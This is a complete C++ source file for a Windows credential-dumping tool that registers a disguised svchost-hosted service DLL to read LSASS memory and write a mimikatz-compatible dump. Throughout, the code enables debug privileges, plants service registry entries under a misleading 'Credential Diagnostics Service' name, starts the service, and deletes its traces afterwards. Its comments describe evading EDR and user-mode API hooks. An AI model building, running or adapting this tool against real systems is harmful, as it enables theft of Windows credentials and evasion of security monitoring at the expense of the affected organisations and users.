/*
 * SvchostLoader.exe — Registers and launches SvcSyscallDll inside svchost.exe
 *
 * Technique: Register a custom service DLL hosted by svchost.exe.
 *            The DLL reads LSASS memory via direct syscalls (NtReadVirtualMemory)
 *            and writes a manual MDMP file — bypassing user-mode API hooks.
 *
 * Flow:
 *   1. Create registry entries for a new svchost-hosted service
 *   2. Add svchost service group
 *   3. Start the service → svchost.exe loads our DLL → reads & dumps LSASS
 *   4. Wait for dump completion
 *   5. Cleanup (--cleanup flag)
 *
 * Usage:
 *   SvchostLoader.exe --dump --out C:\path\to\output.dmp [--dll C:\path\to\SvcSyscallDll.dll]
 *   SvchostLoader.exe --cleanup
 *   SvchostLoader.exe --recon
 *
 * Build: x86_64-w64-mingw32-g++ -o SvchostLoader.exe SvchostLoader.cpp -ladvapi32 -static
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <stdio.h>
#include <string.h>

// ============================================================
// Configuration — must match SvcSyscallDll.cpp
// ============================================================
#define SVC_NAME          L"CredDumpSvc"
#define SVC_DISPLAY_NAME  L"Credential Diagnostics Service"
#define SVC_GROUP         L"CredDiagGroup"
#define SVC_REG_BASE      L"SYSTEM\\CurrentControlSet\\Services\\CredDumpSvc"
#define SVC_REG_PARAMS    L"SYSTEM\\CurrentControlSet\\Services\\CredDumpSvc\\Parameters"
#define SVCHOST_GROUPS    L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost"

// ============================================================
// Enable SeDebugPrivilege
// ============================================================
static BOOL EnablePrivilege(LPCWSTR privName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid);
    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hToken);
    return ok && err == ERROR_SUCCESS;
}

// ============================================================
// Create registry entries for the service
// ============================================================
static BOOL CreateServiceRegistry(const wchar_t *dllPath, const wchar_t *dumpPath) {
    HKEY hKey;
    DWORD disp;
    LONG rc;

    printf("[*] Creating service registry entries...\n");

    // 1. Create the service key
    rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, SVC_REG_BASE, 0, NULL,
                         REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &disp);
    if (rc != ERROR_SUCCESS) {
        printf("[-] Failed to create service key: %ld\n", rc);
        return FALSE;
    }

    // Type = SERVICE_WIN32_SHARE_PROCESS (0x20)
    DWORD svcType = 0x20;
    RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (BYTE*)&svcType, sizeof(svcType));

    // Start = SERVICE_DEMAND_START (0x3)
    DWORD startType = 0x3;
    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&startType, sizeof(startType));

    // ErrorControl = SERVICE_ERROR_NORMAL (0x1)
    DWORD errCtl = 0x1;
    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&errCtl, sizeof(errCtl));

    // ImagePath = %SystemRoot%\System32\svchost.exe -k CredDiagGroup
    wchar_t imgPath[512];
    swprintf_s(imgPath, L"%%SystemRoot%%\\System32\\svchost.exe -k %s", SVC_GROUP);
    RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ, (BYTE*)imgPath,
                   (DWORD)((wcslen(imgPath) + 1) * sizeof(wchar_t)));

    // ObjectName = LocalSystem
    const wchar_t *objName = L"LocalSystem";
    RegSetValueExW(hKey, L"ObjectName", 0, REG_SZ, (const BYTE*)objName,
                   (DWORD)((wcslen(objName) + 1) * sizeof(wchar_t)));

    // DisplayName
    RegSetValueExW(hKey, L"DisplayName", 0, REG_SZ, (const BYTE*)SVC_DISPLAY_NAME,
                   (DWORD)((wcslen(SVC_DISPLAY_NAME) + 1) * sizeof(wchar_t)));

    // Description
    const wchar_t *desc = L"Provides credential diagnostics and validation services";
    RegSetValueExW(hKey, L"Description", 0, REG_SZ, (const BYTE*)desc,
                   (DWORD)((wcslen(desc) + 1) * sizeof(wchar_t)));

    RegCloseKey(hKey);

    // 2. Create Parameters subkey with ServiceDll
    rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, SVC_REG_PARAMS, 0, NULL,
                         REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &disp);
    if (rc != ERROR_SUCCESS) {
        printf("[-] Failed to create Parameters key: %ld\n", rc);
        return FALSE;
    }

    // ServiceDll = path to our DLL
    RegSetValueExW(hKey, L"ServiceDll", 0, REG_EXPAND_SZ, (const BYTE*)dllPath,
                   (DWORD)((wcslen(dllPath) + 1) * sizeof(wchar_t)));

    // ServiceMain = ServiceMain (exported function name)
    const wchar_t *svcMainName = L"ServiceMain";
    RegSetValueExW(hKey, L"ServiceMain", 0, REG_SZ, (const BYTE*)svcMainName,
                   (DWORD)((wcslen(svcMainName) + 1) * sizeof(wchar_t)));

    // ServiceDllUnloadOnStop = 1
    DWORD unload = 1;
    RegSetValueExW(hKey, L"ServiceDllUnloadOnStop", 0, REG_DWORD, (BYTE*)&unload, sizeof(unload));

    // DumpPath = where to write the LSASS dump
    RegSetValueExW(hKey, L"DumpPath", 0, REG_SZ, (const BYTE*)dumpPath,
                   (DWORD)((wcslen(dumpPath) + 1) * sizeof(wchar_t)));

    RegCloseKey(hKey);
    printf("[+] Service registry created: %ls\n", SVC_NAME);

    // 3. Add svchost group entry
    rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, SVCHOST_GROUPS, 0, KEY_ALL_ACCESS, &hKey);
    if (rc != ERROR_SUCCESS) {
        printf("[-] Failed to open svchost groups key: %ld\n", rc);
        return FALSE;
    }

    // Write REG_MULTI_SZ: "CredDumpSvc\0\0"
    wchar_t multiSz[256] = {0};
    wcscpy_s(multiSz, SVC_NAME);
    DWORD multiSzSize = (DWORD)((wcslen(SVC_NAME) + 2) * sizeof(wchar_t));
    RegSetValueExW(hKey, SVC_GROUP, 0, REG_MULTI_SZ, (const BYTE*)multiSz, multiSzSize);
    RegCloseKey(hKey);
    printf("[+] Svchost group registered: %ls\n", SVC_GROUP);

    return TRUE;
}

// ============================================================
// Start the service via SCM
// ============================================================
static BOOL StartDumpService() {
    printf("[*] Starting service via Service Control Manager...\n");

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        printf("[-] OpenSCManager failed: %lu\n", GetLastError());
        return FALSE;
    }

    SC_HANDLE hSvc = OpenServiceW(hSCM, SVC_NAME, SERVICE_ALL_ACCESS);
    if (!hSvc) {
        printf("[*] Service not in SCM, creating via CreateService...\n");
        wchar_t imgPath[512];
        swprintf_s(imgPath, L"%%SystemRoot%%\\System32\\svchost.exe -k %s", SVC_GROUP);

        hSvc = CreateServiceW(
            hSCM,
            SVC_NAME,
            SVC_DISPLAY_NAME,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_SHARE_PROCESS,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            imgPath,
            NULL, NULL, NULL,
            NULL,  // LocalSystem
            NULL
        );
        if (!hSvc) {
            DWORD err = GetLastError();
            if (err == ERROR_SERVICE_EXISTS) {
                printf("[*] Service already exists, opening...\n");
                hSvc = OpenServiceW(hSCM, SVC_NAME, SERVICE_ALL_ACCESS);
            }
            if (!hSvc) {
                printf("[-] CreateService/OpenService failed: %lu\n", GetLastError());
                CloseServiceHandle(hSCM);
                return FALSE;
            }
        }
        printf("[+] Service created in SCM\n");
    }

    // Start the service
    if (!StartServiceW(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[!] Service is already running\n");
        } else {
            printf("[-] StartService failed: %lu\n", err);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hSCM);
            return FALSE;
        }
    }

    printf("[+] Service started — svchost.exe is loading our DLL!\n");
    printf("[*] svchost.exe will open LSASS with PROCESS_ALL_ACCESS\n");
    printf("[*] DLL will read LSASS memory via direct syscalls and write MDMP\n");

    // Wait for service to finish (it self-stops after dump)
    printf("[*] Waiting for dump to complete...\n");
    SERVICE_STATUS ss;
    for (int i = 0; i < 60; i++) {
        Sleep(1000);
        if (QueryServiceStatus(hSvc, &ss)) {
            if (ss.dwCurrentState == SERVICE_STOPPED) {
                printf("[+] Service stopped (completed)\n");
                break;
            }
            printf("    ... service state: %lu\n", ss.dwCurrentState);
        }
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return TRUE;
}

// ============================================================
// Read result status from registry
// ============================================================
static void CheckResult(const wchar_t *dumpPath) {
    HKEY hKey;
    wchar_t status[256] = {0};
    DWORD size = sizeof(status);
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SVC_REG_PARAMS, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExW(hKey, L"DumpStatus", NULL, NULL, (BYTE*)status, &size);
        RegCloseKey(hKey);
    }

    if (wcslen(status) > 0) {
        printf("\n[*] Service reported status: %ls\n", status);
    }

    HANDLE hFile = CreateFileW(dumpPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER fileSize;
        GetFileSizeEx(hFile, &fileSize);
        CloseHandle(hFile);

        if (fileSize.QuadPart > 1024 * 1024) {
            printf("[+] LSASS DUMP SUCCESSFUL!\n");
            printf("[+] Dump file: %ls\n", dumpPath);
            printf("[+] Dump size: %lld bytes (%.2f MB)\n",
                   fileSize.QuadPart, fileSize.QuadPart / (1024.0 * 1024.0));
            printf("\n[+] Technique: svchost.exe service DLL + direct syscall memory read\n");
        } else {
            printf("[-] Dump file exists but is too small (%lld bytes) — might be incomplete\n",
                   fileSize.QuadPart);
        }
    } else {
        printf("[-] Dump file not found: %ls\n", dumpPath);
    }

    // Check for log file
    wchar_t logPath[MAX_PATH];
    wcscpy_s(logPath, dumpPath);
    wchar_t *dot = wcsrchr(logPath, L'.');
    if (dot) wcscpy_s(dot, 5, L".log");
    else wcscat_s(logPath, L".log");

    hFile = CreateFileW(logPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        printf("\n[*] Service log file: %ls\n", logPath);
        DWORD fileSize = GetFileSize(hFile, NULL);
        if (fileSize > 0 && fileSize < 65536) {
            char *buf = (char*)malloc(fileSize + 1);
            DWORD bytesRead;
            if (ReadFile(hFile, buf, fileSize, &bytesRead, NULL)) {
                buf[bytesRead] = '\0';
                printf("--- Service Log ---\n%s--- End Log ---\n", buf);
            }
            free(buf);
        }
        CloseHandle(hFile);
    }
}

// ============================================================
// Cleanup — remove service, registry entries
// ============================================================
static void DoCleanup() {
    printf("[*] Cleaning up...\n");

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        SC_HANDLE hSvc = OpenServiceW(hSCM, SVC_NAME, SERVICE_ALL_ACCESS);
        if (hSvc) {
            SERVICE_STATUS ss;
            ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
            Sleep(1000);
            DeleteService(hSvc);
            printf("[+] Service deleted from SCM\n");
            CloseServiceHandle(hSvc);
        }
        CloseServiceHandle(hSCM);
    }

    RegDeleteKeyW(HKEY_LOCAL_MACHINE, SVC_REG_PARAMS);
    RegDeleteKeyW(HKEY_LOCAL_MACHINE, SVC_REG_BASE);
    printf("[+] Service registry keys deleted\n");

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SVCHOST_GROUPS, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, SVC_GROUP);
        RegCloseKey(hKey);
        printf("[+] Svchost group entry deleted\n");
    }

    printf("[+] Cleanup complete\n");
}

// ============================================================
// Recon — check prerequisites
// ============================================================
static void DoRecon() {
    printf("=== ServiceSyscallDump Recon ===\n\n");

    printf("[*] Technique: Register DLL as svchost.exe-hosted service\n");
    printf("[*] DLL reads LSASS via direct syscalls, writes manual MDMP\n\n");

    // Check admin
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    printf("[%c] Running as Administrator: %s\n", isAdmin ? '+' : '-',
           isAdmin ? "YES" : "NO (REQUIRED!)");

    // Check SeDebugPrivilege
    BOOL hasDebug = EnablePrivilege(L"SeDebugPrivilege");
    printf("[%c] SeDebugPrivilege: %s\n", hasDebug ? '+' : '-',
           hasDebug ? "Available" : "Not available");

    // Check SCM access
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    printf("[%c] SCM full access: %s\n", hSCM ? '+' : '-',
           hSCM ? "YES" : "NO");
    if (hSCM) CloseServiceHandle(hSCM);

    // Check svchost groups registry
    HKEY hKey;
    BOOL canWriteSvchost = FALSE;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SVCHOST_GROUPS, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        canWriteSvchost = TRUE;
        RegCloseKey(hKey);
    }
    printf("[%c] Svchost groups registry writable: %s\n", canWriteSvchost ? '+' : '-',
           canWriteSvchost ? "YES" : "NO");

    // Check if service already exists
    BOOL svcExists = FALSE;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SVC_REG_BASE, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        svcExists = TRUE;
        RegCloseKey(hKey);
    }
    printf("[%c] Service '%ls' exists: %s\n", svcExists ? '!' : '*',
           SVC_NAME, svcExists ? "YES (use --cleanup first)" : "No (clean)");

    printf("\n[*] Attack flow:\n");
    printf("    1. Loader creates service registry entries for svchost-hosted DLL\n");
    printf("    2. Loader adds svchost group, starts service via SCM\n");
    printf("    3. SCM spawns: svchost.exe -k CredDiagGroup\n");
    printf("    4. svchost.exe loads our DLL, calls ServiceMain\n");
    printf("    5. DLL opens LSASS (svchost.exe is typically trusted by EDRs)\n");
    printf("    6. DLL maps clean ntdll.dll from disk, resolves SSN\n");
    printf("    7. VirtualQueryEx enumerates LSASS memory regions\n");
    printf("    8. Direct syscall NtReadVirtualMemory reads all regions\n");
    printf("    9. Manual MDMP writer produces WinDbg/mimikatz-compatible dump\n\n");

    if (isAdmin && hasDebug && hSCM && canWriteSvchost && !svcExists) {
        printf("[+] All prerequisites met — technique should work!\n");
    } else {
        printf("[!] Some prerequisites not met — fix issues above\n");
    }
}

// ============================================================
// Usage
// ============================================================
static void PrintUsage(const char *exe) {
    printf("ServiceSyscallDump — LSASS dump via svchost.exe service DLL + direct syscalls\n\n");
    printf("Usage:\n");
    printf("  %s --recon                           Check prerequisites\n", exe);
    printf("  %s --dump --out <path> --dll <dll>    Register service & dump LSASS\n", exe);
    printf("  %s --cleanup                          Remove service & registry entries\n", exe);
    printf("\nOptions:\n");
    printf("  --out <path>   Output path for the LSASS dump file\n");
    printf("  --dll <path>   Path to SvcSyscallDll.dll (default: same directory as loader)\n");
    printf("\nExample:\n");
    printf("  %s --dump --out C:\\Windows\\Temp\\debug.dmp --dll C:\\path\\to\\SvcSyscallDll.dll\n", exe);
}

// ============================================================
// Main
// ============================================================
int main(int argc, char *argv[]) {
    if (argc < 2) {
        PrintUsage(argv[0]);
        return 1;
    }

    BOOL doRecon   = FALSE;
    BOOL doDump    = FALSE;
    BOOL doClean   = FALSE;
    char outPath[MAX_PATH]  = {0};
    char dllPath[MAX_PATH]  = {0};

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--recon") == 0)   doRecon = TRUE;
        else if (strcmp(argv[i], "--dump") == 0)  doDump = TRUE;
        else if (strcmp(argv[i], "--cleanup") == 0) doClean = TRUE;
        else if (strcmp(argv[i], "--out") == 0 && i + 1 < argc)  strcpy_s(outPath, argv[++i]);
        else if (strcmp(argv[i], "--dll") == 0 && i + 1 < argc)  strcpy_s(dllPath, argv[++i]);
    }

    if (doRecon) {
        DoRecon();
        return 0;
    }

    if (doClean) {
        DoCleanup();
        return 0;
    }

    if (doDump) {
        if (outPath[0] == 0) {
            printf("[-] --out <path> is required\n");
            return 1;
        }

        // Default DLL path: same directory as this exe
        if (dllPath[0] == 0) {
            char exePath[MAX_PATH];
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            char *lastSlash = strrchr(exePath, '\\');
            if (lastSlash) {
                lastSlash[1] = '\0';
                strcat_s(exePath, "SvcSyscallDll.dll");
                strcpy_s(dllPath, exePath);
            }
        }

        // Verify DLL exists
        if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
            printf("[-] DLL not found: %s\n", dllPath);
            printf("[-] Build SvcSyscallDll.dll and place it next to this exe, or use --dll\n");
            return 1;
        }

        // Convert relative DLL path to absolute path.
        // svchost.exe runs from System32 — relative paths won't resolve.
        char absDllPath[MAX_PATH] = {0};
        if (!GetFullPathNameA(dllPath, MAX_PATH, absDllPath, NULL)) {
            printf("[-] Failed to resolve absolute path for DLL: %s\n", dllPath);
            return 1;
        }
        strcpy_s(dllPath, absDllPath);

        char absOutPath[MAX_PATH] = {0};
        if (!GetFullPathNameA(outPath, MAX_PATH, absOutPath, NULL)) {
            printf("[-] Failed to resolve absolute path for output: %s\n", outPath);
            return 1;
        }
        strcpy_s(outPath, absOutPath);

        printf("=== ServiceSyscallDump — svchost.exe Service DLL + Direct Syscalls ===\n\n");
        printf("[*] DLL:  %s\n", dllPath);
        printf("[*] Dump: %s\n\n", outPath);

        // Convert to wide strings
        wchar_t wDllPath[MAX_PATH], wOutPath[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, dllPath, -1, wDllPath, MAX_PATH);
        MultiByteToWideChar(CP_ACP, 0, outPath, -1, wOutPath, MAX_PATH);

        // Step 1: Enable privileges
        EnablePrivilege(L"SeDebugPrivilege");
        printf("[+] SeDebugPrivilege enabled\n");

        // Step 2: Create service registry
        if (!CreateServiceRegistry(wDllPath, wOutPath)) {
            printf("[-] Failed to create service registry\n");
            return 1;
        }

        // Step 3: Start the service
        if (!StartDumpService()) {
            printf("[-] Failed to start service\n");
            printf("[*] Run --cleanup to remove partial entries\n");
            return 1;
        }

        // Step 4: Check result
        CheckResult(wOutPath);

        // Step 5: Auto-cleanup
        printf("\n[*] Auto-cleaning up service entries...\n");
        DoCleanup();

        return 0;
    }

    PrintUsage(argv[0]);
    return 1;
}
